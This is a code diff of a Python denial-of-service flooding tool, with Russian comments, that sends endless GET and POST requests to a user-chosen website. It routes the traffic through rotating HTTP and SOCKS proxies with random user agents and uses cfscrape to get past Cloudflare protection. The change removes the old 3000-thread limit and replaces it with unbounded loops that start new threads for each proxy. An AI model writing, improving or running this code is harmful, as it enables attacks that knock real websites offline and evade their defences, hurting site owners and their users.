@@ -11,8 +11,6 @@ from numba import prange
 
 os.system("clear")
 
-s = cfscrape.create_scraper()
-
 # Получение User-Agent
 with open('useragent') as file:
     headersp = ''.join(file.readlines()).strip().split('\n')
@@ -46,67 +44,57 @@ with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
 
+
 # Аттака
-def dos1_1(target):
-    while True:
-        useragent = random.choice(headersp)
-        header = {'accept': '*/*', 'user-agent': useragent}
+def dos1_1(target, proxy):
+    s = cfscrape.create_scraper()
 
-        useragent2 = random.choice(headersp)
-        header2 = {'accept': '*/*', 'user-agent': useragent2}
+    useragent = random.choice(headersp)
+    header = {'accept': '*/*', 'user-agent': useragent}
 
-        proxyagenthttp = random.choice(proxy_http)
-        proxyagentsocks = random.choice(proxy_socks)
+    useragent2 = random.choice(headersp)
+    header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-        proxieshttphttp = {
-            'http': f'http://{proxyagenthttp}',
-            'https': f'http://{proxyagenthttp}'
-        }
-        proxiessockshttp = {
-            'http': f'socks5://{proxyagentsocks}',
-            'https': f'socks5://{proxyagentsocks}'
-        }
+    proxiessockshttp = {
+        'http': f'socks5://{proxy}',
+        'https': f'socks5://{proxy}'
+    }
 
-        try:
-            s.get(target, headers=header, proxies=proxieshttphttp)
-        except:
-            pass
+    try:
+        s.get(target, headers=header, proxies=proxiessockshttp)
+    except:
+        pass
 
-        try:
-            s.get(target, headers=header2, proxies=proxiessockshttp)
-        except:
-            pass
+    try:
+        s.post(target, headers=header2, proxies=proxiessockshttp)
+    except:
+        pass
 
 
-def dos1_2(target):
-    while True:
-        useragent = random.choice(headersp)
-        header = {'accept': '*/*', 'user-agent': useragent}
+def dos1_2(target, proxy):
+    s = cfscrape.create_scraper()
 
-        useragent2 = random.choice(headersp)
-        header2 = {'accept': '*/*', 'user-agent': useragent2}
+    useragent = random.choice(headersp)
+    header = {'accept': '*/*', 'user-agent': useragent}
 
-        proxyagenthttp = random.choice(proxy_http)
-        proxyagentsocks = random.choice(proxy_socks)
+    useragent2 = random.choice(headersp)
+    header2 = {'accept': '*/*', 'user-agent': useragent2}
 
-        proxieshttphttp = {
-            'http': f'http://{proxyagenthttp}',
-            'https': f'http://{proxyagenthttp}'
-        }
-        proxiessockshttp = {
-            'http': f'socks5://{proxyagentsocks}',
-            'https': f'socks5://{proxyagentsocks}'
-        }
+    proxieshttphttp = {
+        'http': f'http://{proxy}',
+        'https': f'http://{proxy}'
+    }
 
-        try:
-            s.post(target, headers=header, proxies=proxieshttphttp)
-        except:
-            pass
+    try:
+        s.get(target, headers=header, proxies=proxieshttphttp)
+    except:
+        pass
 
-        try:
-            s.post(target, headers=header2, proxies=proxiessockshttp)
-        except:
-            pass
+    try:
+        s.post(target, headers=header2, proxies=proxieshttphttp)
+    except:
+        pass
+
 
 def dos2(target):
     while True:
@@ -136,29 +124,18 @@ if not url.__contains__("http"):
 if not url.__contains__("."):
     exit(colorama.Fore.RED + "Invalid domain")
 
-try:
-    threads = int(input("Threads[max 3000]: "))
-except ValueError:
-    exit(colorama.Fore.RED + "Threads count is incorrect!")
-
-if threads == 0 or threads > 3000:
-    exit(colorama.Fore.RED + "Threads count is incorrect!")
-
-bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
-print(colorama.Fore.YELLOW + "Starting threads...")
 if proxyuseage == 1:
-    for i in prange(0, threads):
-        threading.Thread(target=dos1_1, args=(url,)).start()
-        threading.Thread(target=dos1_2, args=(url,)).start()
-        print("\r Threads: " + str(i), end='')
+    while True:
+        for number_socks in proxy_http:
+            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
+        for number_http in proxy_socks:
+            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
 else:
-    for i in prange(0, threads):
-        thr2 = threading.Thread(target=dos2, args=(url,))
-        thr2.start()
-print(colorama.Fore.GREEN + "All threads are running!")
+    while True:
+        threading.Thread(target=dos2, args=(url,)).start()
 print(Style.RESET_ALL)
 
 while True:
